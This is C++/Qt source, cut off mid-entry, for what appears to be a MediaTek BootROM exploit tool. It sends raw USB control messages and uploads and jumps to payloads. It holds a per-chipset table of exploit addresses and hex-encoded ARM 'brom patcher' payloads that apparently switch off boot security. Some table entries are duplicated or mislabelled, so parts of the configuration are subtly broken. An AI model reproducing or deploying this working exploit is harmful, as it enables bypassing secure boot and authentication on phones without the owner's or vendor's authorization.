#include "boot_rom.h"
#include "ui_mainwindow.h"
#include "boot_rom_cmd.h"
#include "usb_defs.h"

qbool boot_rom::UsbSendDevCtrl(qchar req_type, qchar req, qshort val, qshort idx, qbyte &buff)
{
    qsizetype ret = 0;

    QTemporaryDir tdir;
    if (!tdir.isValid())
        return 0;
    qstr dir = tdir.path();

    qstr lib_path = qstr("%1/mrx_usb.dll").arg(dir);
    qbyte data = mCallback::ReadFile(qstr(":/res/res/lib_%0").arg(mCallback::IsWow64()?"64" : "32"));

    if(!mCallback::WriteFile(lib_path, data))
        return 0;

    QLibrary lib;
    lib.setFileName(lib_path);
    SetDllDirectory(QFileInfo(lib.fileName()).absolutePath().toStdWString().c_str());
    if(!lib.load())
    {
        send_log_fail(qstr("MTKCommIO::UsbSendDevCtrl:load_libusb0 fail(%0)").arg(lib.errorString()));
        return 0;
    }

    typedef void __stdcall (*usb_init_t)(void);
    usb_init_t usb_init = (usb_init_t)lib.resolve("usb_init");
    if(!usb_init)
        return 0;

    typedef WinUSB::usb_dev_handle* __stdcall (*usb_open_t)(WinUSB::usb_device *dev);
    usb_open_t usb_open = (usb_open_t)lib.resolve("usb_open");
    if(!usb_open)
        return 0;

    typedef int __stdcall (*usb_reset_t)(WinUSB::usb_dev_handle *dev);
    usb_reset_t usb_reset = (usb_reset_t)lib.resolve("usb_reset");
    if(!usb_reset)
        return 0;

    typedef int __stdcall (*usb_close_t)(WinUSB::usb_dev_handle *dev);
    usb_close_t usb_close = (usb_close_t)lib.resolve("usb_close");
    if(!usb_close)
        return 0;

    typedef void __stdcall (*usb_set_debug_t)(int level);
    usb_set_debug_t usb_set_debug = (usb_set_debug_t)lib.resolve("usb_set_debug");
    if(!usb_set_debug)
        return 0;

    typedef char* __stdcall (*usb_strerror_t)(void);
    usb_strerror_t usb_strerror = (usb_strerror_t)lib.resolve("usb_strerror");
    if(!usb_strerror)
        return 0;

    typedef int __stdcall (*usb_find_busses_t)(void);
    usb_find_busses_t usb_find_busses = (usb_find_busses_t)lib.resolve("usb_find_busses");
    if(!usb_find_busses)
        return 0;

    typedef int __stdcall (*usb_find_devices_t)(void);
    usb_find_devices_t usb_find_devices = (usb_find_devices_t)lib.resolve("usb_find_devices");
    if(!usb_find_devices)
        return 0;

    typedef struct WinUSB::usb_bus* __stdcall (*usb_get_busses_t)(void);
    usb_get_busses_t usb_get_busses = (usb_get_busses_t)lib.resolve("usb_get_busses");
    if(!usb_get_busses)
        return 0;

    typedef int __stdcall (*usb_control_msg_t)(WinUSB::usb_dev_handle *dev, int requesttype, int request,
                                               int value, int index, char *bytes, int size,
                                               int timeout);
    usb_control_msg_t usb_control_msg = (usb_control_msg_t)lib.resolve("usb_control_msg");
    if(!usb_control_msg)
        return 0;

    typedef int __stdcall (*usb_set_configuration_t)(WinUSB::usb_dev_handle *dev, int configuration);
    usb_set_configuration_t usb_set_configuration = (usb_set_configuration_t)lib.resolve("usb_set_configuration");
    if(!usb_set_configuration)
        return 0;

    typedef int __stdcall (*usb_claim_interface_t)(WinUSB::usb_dev_handle *dev, int ifc_num);
    usb_claim_interface_t usb_claim_interface = (usb_claim_interface_t)lib.resolve("usb_claim_interface");
    if(!usb_claim_interface)
        return 0;

    typedef int __stdcall (*usb_resetep_t)(WinUSB::usb_dev_handle *dev, unsigned int ep);
    usb_resetep_t usb_resetep = (usb_resetep_t)lib.resolve("usb_resetep");
    if(!usb_resetep)
        return 0;

    typedef int __stdcall (*usb_reset_ex_t)(WinUSB::usb_dev_handle *dev, unsigned int reset_type);
    usb_reset_ex_t usb_reset_ex = (usb_reset_ex_t)lib.resolve("usb_reset_ex");
    if(!usb_reset_ex)
        return 0;

    typedef int __stdcall (*usb_release_interface_t)(WinUSB::usb_dev_handle *dev, int ifc_num);
    usb_release_interface_t usb_release_interface = (usb_release_interface_t)lib.resolve("usb_release_interface");
    if(!usb_release_interface)
        return 0;

    usb_init();
    usb_find_busses();
    usb_find_devices();

    WinUSB::usb_dev_handle *hnd = Q_NULLPTR;

    for (WinUSB::usb_bus* bus = usb_get_busses(); bus; bus = bus->next)
    {
        for (WinUSB::usb_device* dev = bus->devices; dev; dev = dev->next)
        {
            if (dev->descriptor.idVendor == 0xe8d
                    && dev->descriptor.idProduct == 0x3)
            {
                hnd = usb_open(dev);
                if(hnd && qstr("%0").arg(usb_strerror()) == "No error")
                {
                    qInfo().noquote().nospace() << qstr("MTKCommIO::UsbSendDevCtrl(usb_open:%0:%1)").arg(mCallback::GetU32((quint)hnd), usb_strerror());
                }
            }
        }
    }

    if(hnd == Q_NULLPTR)
        return 0;

    WinUSB::USBCtrlPkt setup_pkt = {};
    setup_pkt.bmRequestType = req_type;
    setup_pkt.bRequest = req;
    setup_pkt.wValue = quint16_le(val);
    setup_pkt.wIndex = quint16_le(idx);
    setup_pkt.wLength = quint16_le(buff.size());

    ret = usb_control_msg(hnd,
                          setup_pkt.bmRequestType,
                          setup_pkt.bRequest,
                          setup_pkt.wValue,
                          setup_pkt.wIndex,
                          buff.data(),
                          setup_pkt.wLength,
                          0x00000000);


    qbyte pkt((char*)&setup_pkt, sizeof(setup_pkt));
    pkt.append(buff);
    if (ret != 0 && ret != buff.size() && ret != pkt.size())
        return 0;

    ret = usb_release_interface(hnd, 0);
    ret = usb_resetep(hnd, 0);
    return (usb_close(hnd) == 0);
}

quint8 boot_rom::GetNum(quint8 val)
{
    return val;
}

QByteArray boot_rom::GetLow16(quint16 value)
{
    QByteArray res = {};
    QDataStream stream(&res, QIODevice::ReadWrite);
    stream.setByteOrder(QDataStream::LittleEndian);
    stream << quint16(value);
    return res;
}

bool boot_rom::readack(qsizetype ret, bool brom)
{
    bool okay = 0;
    quint16 ack = {};
    read16(&ack);

    okay = ((ret == 0xff)? 1 : (ack == ret));
    if(!okay)
    {
        send_log_fail(qstr("BRom_MT6276::Brom:err:(%0)").arg(mCallback::GetU16(ack)));
    }

    return okay;
}
bool boot_rom::BRom_WriteCmd32(quint32 addr, quint32 val)
{
    if (!brom_write8_echo(0xd4))
        return 0;
    if (!write32(addr, 1))
        return 0;
    if (!write32(0x1, 1))
        return 0;
    if (!readack(0x1, 1))
        return 0;
    if(!write32(val, 1))
        return 0;
    if (!readack(0x1, 1))
        return 0;

    return 1;
}

bool boot_rom::BRom_ReadCmd32(quint32 addr, quint32 val, quint8 read, quint32 len, bool no_ack)
{
    if (!brom_write8_echo(0xd1))
        return 0;
    if (!write32(addr, 1))
        return 0;
    if (!write32(val, 1))
        return 0;

    if(!read)
    {
        if (!readack(0xff, 1))
            return 0;
    }
    else
    {
        if (!readack(0x00, 1))
            return 0;
        QByteArray read = {};
        if(!this->read_pattern(read, len))
            return 0;
        if (!readack(0x00, 1))
            return 0;
    }

    return 1;
}

bool boot_rom::SendDA(quint32 addr, quint32 da_len, quint32 sig_len, QByteArray da, quint16 &checksum)
{
    if (!brom_write8_echo(0xd7))
        return false;

    if (!brom_write32_echo(addr))
        return false;

    if (!brom_write32_echo(da_len))
        return false;

    if (!brom_write32_echo(sig_len))
        return false;

    quint16 check;
    read16(&check);
    if(check != 0)
        return false;

    if (!write_ptr((char*)da.constData(), da.size()))
        return false;

    bool do_check = 1;

    if (do_check)
    {
        checksum = 0;
        read16(&checksum);
    }

    read16(&checksum);

    return true;
}

quint16 boot_rom::da_read16(quint32 addr)
{
    if (!brom_write8_echo(0xd0))
        return false;

    if (!brom_write32_echo(addr))
        return false;

    quint16 read = 0;
    read16(&read);

    return read;
}

bool boot_rom::send_da(QByteArray da, quint32 da_len, quint32 addr, quint32 sig_len)
{
    if (!brom_write8_echo(0xd7))
        return false;

    if (!brom_write32_echo(addr))
        return false;

    if (!brom_write32_echo(da_len))
        return false;

    if (!brom_write32_echo(sig_len))
        return false;

    quint16 check;
    read16(&check);
    if(check != 0)
        return false;

    if (!write_ptr((char*)da.constData(), da.size()))
    {
        send_log_fail("\nBRom6762::xflash_boot_rom:sv5_send da fail{0xc0060003}");
        return false;
    }

    read16(&check);

    return true;
}

bool boot_rom::JumpDa(quint32 addr)
{
    if (!brom_write8_echo(0xd5))
        return false;

    if (!brom_write32_echo(addr))
        return false;

    quint16 check;
    read16(&check);
    if(check != 0)
        return false;

    return true;
}

bool boot_rom::Write32(quint32 addr, QList<quint32> list, bool needcheck)
{
    if (!brom_write8_echo(0xd4))
        return false;

    if (!brom_write32_echo(addr))
        return false;

    if (!brom_write32_echo(list.count()))
        return false;

    quint16 check;
    read16(&check);
    if(check != 1)
        return false;

    for (int i = 0; i < list.count(); i++)
    {
        if (!brom_write32_echo(list.at(i)))
            return false;
    }

    if(needcheck)
    {
        quint16 check;
        read16(&check);
        if(check != 1)
            return false;
    }

    return true;
}

bool boot_rom::Read32(QByteArray &data, quint32 addr, int size)
{
    if (!brom_write8_echo(0xd1))
        return false;

    if (!brom_write32_echo(addr))
        return false;

    if (!brom_write32_echo(size))
        return false;

    quint16 check1;
    read16(&check1);
    if(check1 != 0)
        return false;

    for (int i = 0; i < size; i++)
    {
        char buff[4];
        int len = read_ptr(buff, sizeof(buff));
        if (len <= 0)
            break;
        data.append(buff, len);
    }

    quint16 check2;
    read16(&check2);
    if(check2 != 0)
        return false;

    return true;
}

bool boot_rom::prepare_payload(Config config, QByteArray &payload)
{
    payload = mCallback::ReadFile(qstr(":/res/res/%0").arg(config.payloadname));

    int size = payload.size();
    quint32 wdg_addr = 0, uart_base = 0;

    int wdg_offset = size - sizeof(quint32);
    int uart_offset = size - (sizeof(quint32) * 2);

    QBuffer buffer(&payload);
    if (!buffer.open(QBuffer::ReadWrite))
    {
        send_log_red(QString("%1").arg(buffer.errorString()));
        return false;
    }

    if (!buffer.seek(wdg_offset))
    {
        send_log_red(QString("%1").arg(buffer.errorString()));
        return false;
    }
    if (buffer.read((char*)&wdg_addr, sizeof(quint32)) != sizeof(quint32))
    {
        send_log_red(QString("%1").arg(buffer.errorString()));
        return false;
    }
    if (wdg_addr == 0x10007000)
    {
        if (!buffer.seek(wdg_offset))
        {
            send_log_red(QString("%1").arg(buffer.errorString()));
            return false;
        }

        if (buffer.write((char*)&config.wdg_addr, sizeof(quint32)) != sizeof(quint32))
        {
            send_log_red(QString("%1").arg(buffer.errorString()));
            return false;
        }
    }

    if (!buffer.seek(uart_offset))
    {
        send_log_red(QString("%1").arg(buffer.errorString()));
        return false;
    }
    if (buffer.read((char*)&uart_base, sizeof(quint32)) != sizeof(quint32))
    {
        send_log_red(QString("%1").arg(buffer.errorString()));
        return false;
    }
    if (uart_base == 0x11002000)
    {
        if (!buffer.seek(uart_offset))
        {
            send_log_red(QString("%1").arg(buffer.errorString()));
            return false;
        }

        if (buffer.write((char*)&config.uart_base, sizeof(quint32)) != sizeof(quint32))
        {
            send_log_red(QString("%1").arg(buffer.errorString()));
            return false;
        }
    }

    buffer.close();

    while (payload.size()%4)
        payload.append("\x00");

    if (payload.size() >= 0xa00)
    {
        send_log_red("payload data too large");
        return false;
    }

    return true;
}

bool boot_rom::brom_set_sec_cfg(quint16 hw_code, bool secure, bool dump_pl)
{
    QMap<QString, Config> map = {};
    {
        QString target;
        Config info = {};
        target = "mt6261";
        {
            info.var0 = -1;
            info.var1 = 0x28;
            info.hwcode = 0x6261;
            info.wdg_addr = 0xA0030000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6261_payload.bin";

        }
        map.insert(target, info);

        target = "mt6572";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x6572;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x10036A0;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6572_payload.bin";

            info.ptr_usbdl =0x40ba68;
            info.ptr_da = 0x40befc;
        }
        map.insert(target, info);

        target = "mt6580";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x6580;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6580_payload.bin";

            info.ptr_usbdl =0xb60c;
            info.ptr_da = 0xba94;
        }
        map.insert(target, info);

        target = "mt6582";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x6582;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6582_payload.bin";

            info.ptr_usbdl =0xa5fc;
            info.ptr_da = 0xaa84;
        }
        map.insert(target, info);

        target = "mt6592";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x6592;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6592_payload.bin";

            info.ptr_usbdl =0xa564;
            info.ptr_da = 0xa9ec;
        }
        map.insert(target, info);

        target = "mt6595";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x6595;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6595_payload.bin";

            info.ptr_usbdl =0xb218;
            info.ptr_da = 0xb6a0;
        }
        map.insert(target, info);

        target = "mt6735";
        {
            info.var0 = 0X10;
            info.var1 = 0x28;
            info.hwcode = 0x321;
            info.wdg_addr = 0x10212000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6735_payload.bin";
            info.ptr_usbdl =0x95f8;
            info.ptr_da = 0x9a94;
        }
        map.insert(target, info);

        target = "mt6737";
        {
            info.var0 = 0X10;
            info.var1 = 0x28;
            info.hwcode = 0x335;
            info.wdg_addr = 0x10212000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6737_payload.bin";
            info.ptr_usbdl =0x9608;
            info.ptr_da = 0x9aa4;
        }
        map.insert(target, info);

        target = "mt6739";
        {
            info.var0 = 0X20;
            info.var1 = 0xB4;
            info.hwcode = 0x699;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6739_payload.bin";
            info.ptr_usbdl =0xdf1c;
            info.ptr_da = 0xe3e8;
        }
        map.insert(target, info);

        target = "mt6753";
        {
            info.var0 = 0X20;
            info.var1 = 0xB4;
            info.hwcode = 0x337;
            info.wdg_addr = 0x10212000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6753_payload.bin";
            info.ptr_usbdl =0x9668;
            info.ptr_da = 0x9b04;
        }
        map.insert(target, info);

        target = "mt6755";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x326;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6755_payload.bin";
            info.ptr_usbdl =0x9a6c;
            info.ptr_da = 0x9f14;
        }
        map.insert(target, info);

        target = "mt6757";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x551;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6757_payload.bin";
            info.ptr_usbdl =0x9c2c;
            info.ptr_da = 0xa0e8;
        }
        map.insert(target, info);

        target = "mt6761";
        {
            info.var0 = -1;
            info.var1 = 0x25;
            info.hwcode = 0x717;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6761_payload.bin";
            info.ptr_usbdl =0xbc8c;
            info.ptr_da = 0xc158;
        }
        map.insert(target, info);

        target = "mt6763";
        {
            info.var0 = -1;
            info.var1 = 0x7f;
            info.hwcode = 0x690;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6763_payload.bin";
            info.ptr_usbdl =0xd66c;
            info.ptr_da = 0xdb38;
        }
        map.insert(target, info);

        target = "mt6765";
        {
            info.var0 = 0x2c;
            info.var1 = 0x25;
            info.hwcode = 0x766;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6765_payload.bin";
            info.ptr_usbdl =0xbdc0;
            info.ptr_da = 0xc28c;
        }
        map.insert(target, info);

        target = "mt6768";
        {
            info.var0 = 0x2c;
            info.var1 = 0x25;
            info.hwcode = 0x707;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6768_payload.bin";
            info.ptr_usbdl = 0xc190;
            info.ptr_da = 0xc650;
        }
        map.insert(target, info);

        target = "mt6771";
        {
            info.var0 = 0x20;
            info.var1 = 0xa;
            info.hwcode = 0x788;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6771_payload.bin";

            info.ptr_usbdl =0xdebc;
            info.ptr_da = 0xe388;
        }
        map.insert(target, info);

        target = "mt6785";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x813;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6785_payload.bin";
            info.ptr_usbdl =0xe2a4;
            info.ptr_da = 0xe764;
        }
        map.insert(target, info);

        target = "mt6795";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x6795;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6795_payload.bin";
            info.ptr_usbdl =0x978c;
            info.ptr_da = 0x9c28;
        }
        map.insert(target, info);

        target = "mt6797";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x279;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6797_payload.bin";
            info.ptr_usbdl =0x9eac;
            info.ptr_da = 0xa354;
        }
        map.insert(target, info);


        target = "mt6797";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x279;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6885_payload.bin";
            info.ptr_usbdl =0xe6b8;
            info.ptr_da = 0xebbc;
        }
        map.insert(target, info);

        target = "mt6799";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x562;
            info.wdg_addr = 0x10211000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6799_payload.bin";
            info.ptr_usbdl =0xf5ac;
            info.ptr_da = 0xfa78;

        }
        map.insert(target, info);

        ///****************************************************************************
        target = "mt6779";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x725;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6779_payload.bin";
            info.ptr_usbdl =0xe04c;
            info.ptr_da = 0xe50c;
        }
        map.insert(target, info);
        ///****************************************************************************

        target = "mt6873";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x886;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6873_payload.bin";
            info.ptr_usbdl = 0xea78;
            info.ptr_da = 0xef38;
        }
        map.insert(target, info);

        target = "mt8127";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x8127;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt8127_payload.bin";
            info.ptr_usbdl =0xb2b8;
            info.ptr_da = 0xb740;
        }
        map.insert(target, info);

        target = "mt8163";
        {
            info.var0 = -1;
            info.var1 = 0xb1;
            info.hwcode = 0x8163;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt8163_payload.bin";
            info.ptr_usbdl =0xc12c;
            info.ptr_da = 0xc5c8;
        }
        map.insert(target, info);

        target = "mt8167";
        {
            info.var0 = -1;
            info.var1 = 0xCC;
            info.hwcode = 0x8167;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt8167_payload.bin";
            info.ptr_usbdl =0xd2e4;
            info.ptr_da = 0xd7ac;
        }
        map.insert(target, info);

        target = "mt8173";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x8172;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x120A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt8173_payload.bin";
            info.ptr_usbdl =0xea78;
            info.ptr_da = 0xef38;
        }
        map.insert(target, info);

        target = "mt8695";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x8695;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt8590_payload.bin";
            info.ptr_usbdl = 0xbbe4;
            info.ptr_da = 0xc06c;
        }
        map.insert(target, info);

        target = "mt8695";
        {
            info.var0 = -1;
            info.var1 = 0xa;
            info.hwcode = 0x8695;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt8695_payload.bin";
            info.ptr_usbdl = 0xbeec;
            info.ptr_da = 0xc3f8;
        }
        map.insert(target, info);

        target = "MT6833";
        {
            info.hwcode = 0x989;
            info.ptr_usbdl = 0xdfe0;
            info.ptr_da = 0xe4a0; //ptr_da = brom_register_access 2;
            info.pl_addr = 0x100a00;

            info.payload = qbyte::fromHex("01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A000001000000E0DF000014200011002000116D74363833330000F3480000280000000C2B1000BC27100044281000546B1000ADED0000");
        }
        map.insert(target, info);

        target = "MT6853";
        {
            info.hwcode = 0x996;
            info.ptr_usbdl = 0xea64;
            info.ptr_da = 0xef24;
            info.pl_addr = 0x100a00;
            info.payload = qbyte::fromHex("01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A00000100000064EA000014200011002000116D743638353300008F530000280000000C2B1000C42710004C281000606B100031F80000");
        }
        map.insert(target, info);

        target = "MT6891Z/MT6839";
        {
            info.hwcode = 0x950;
            info.ptr_usbdl = 0xe79c;
            info.ptr_da = 0xec5c;
            info.pl_addr = 0x100a00;

            info.payload =  qbyte::fromHex("01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A0000010000009CE7000014200011002000116D743638393300001F500000280000000C2B1000C027100048281000606B100069F50000");
        }
        map.insert(target, info);

        target = "MT6880/MT6883/MT6885/MT6889/MT6890";
        {
            info.hwcode = 0x816;
            info.ptr_usbdl = 0xe6fc;
            info.ptr_da = 0xebbc;
            info.pl_addr = 0x100a00;

            info.payload = qbyte::fromHex("01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A000001000000FCE6000014200011002000116D743638383500005B500000280000000C2B1000C027100048281000606B100081F40000");
        }
        map.insert(target, info);

        target = "MT6877";
        {
            info.hwcode = 0x959;
            info.ptr_usbdl = 0xe8d0;
            info.ptr_da = 0xed90;
            info.pl_addr = 0x100a00;

            info.payload = qbyte::fromHex("01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A000001000000D0E8000014200011002000116D7436383737000087510000280000000C2B1000C027100048281000606B10009DF60000");
        }
        map.insert(target, info);

        target = "MT6781";
        {
            info.var0 = -1;
            info.var1 = 0x73;
            info.hwcode = 0x1066;
            info.wdg_addr = 0x10007000;
            info.payload_addr = 0x100A00;
            info.uart_base = 0x11002000;
            info.payloadname = "mt6781_payload.bin";
            info.ptr_usbdl = 0xe5d8;
            info.ptr_da = 0xea94; //ptr_da = brom_register_access 2;
            info.pl_addr = 0x100a00;

